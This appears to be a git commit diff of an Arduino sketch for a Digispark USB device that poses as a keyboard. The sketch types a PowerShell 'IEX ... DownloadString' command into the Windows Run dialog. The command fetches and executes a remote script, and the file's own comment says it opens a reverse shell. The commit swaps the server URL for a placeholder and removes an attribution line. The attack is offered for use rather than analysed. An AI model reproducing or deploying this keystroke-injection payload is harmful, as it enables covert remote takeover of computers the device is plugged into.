590cb4d21b97bc820c0aeba6afd5967ac236a39e
Ranjith-Robin <138836783+Ranjith-Robin@users.noreply.github.com>
2023-09-15 08:00:44 -0700

    payload_executer.ino
    This code will help you to download and execute a payload from internet

--- digispark/payload_executer.ino
+++ digispark/payload_executer.ino
@@ -1,5 +1,5 @@
 // This script downloads and executes a powershell script efectively opening up a reverse shell in less than 3 seconds. 
-// Credits to hak5 and samratashok (developer of the nishang framework).
+
 
 #include "DigiKeyboard.h"
 void setup() {
@@ -10,7 +10,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://mywebserver/payload.ps1');\"");
+  DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('<payload link>');\"");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   for (;;) {
     /*Stops the digispark from running the scipt again*/
